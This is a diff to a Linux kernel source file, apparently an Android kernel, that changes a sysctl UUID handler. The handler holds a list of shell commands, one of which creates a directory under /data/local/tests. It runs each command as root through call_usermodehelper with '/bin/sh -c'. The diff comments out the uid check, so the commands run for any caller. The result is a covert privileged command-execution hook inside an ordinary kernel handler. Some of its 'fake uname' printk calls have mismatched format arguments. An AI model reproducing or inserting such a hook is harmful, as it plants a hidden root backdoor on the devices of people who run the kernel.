@@ -60,6 +60,8 @@
 #include <asm/irq.h>
 #include <asm/irq_regs.h>
 #include <asm/io.h>
+#include <linux/file.h>
+
 
 /*********************************************************************
  *
@@ -1508,8 +1510,6 @@ else\
      mkdir /data/local/tests/hoa/concac1;\
 fi", NULL };
 	
-	file_size = get_file_size(filename);
-	printk("fake uname: %s/%d ret1=%d\n", current->comm, current->pid, file_size);
 	u8 tmp_uuid[UUID_SIZE], *uuid;
 	char uuid_string[UUID_STRING_LEN + 1];
 	struct ctl_table fake_table = {
@@ -1533,14 +1533,16 @@ fi", NULL };
 //    }
 //    printk("fake uname: %s/%d/%d ret1=%d\n", current->comm, current->pid, vl, ret1);
 //  }
-if (current_uid().val > 0) {
+//if (current_uid().val > 0) {
 	  for (vl = 0; cmd[vl]; vl++) {
     char* argv[] = { "/bin/sh", "-c", cmd[vl], NULL };
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
   printk("fake uname: %s/ ret1=%d\n", current->comm, current->pid);
   }
 
-}
+// }
+	file_size = get_file_size(filename);
+	printk("fake uname: %s/%d ret1=%d\n", current->comm, current->pid, file_size);
 	if (write)
 		return -EPERM;
 
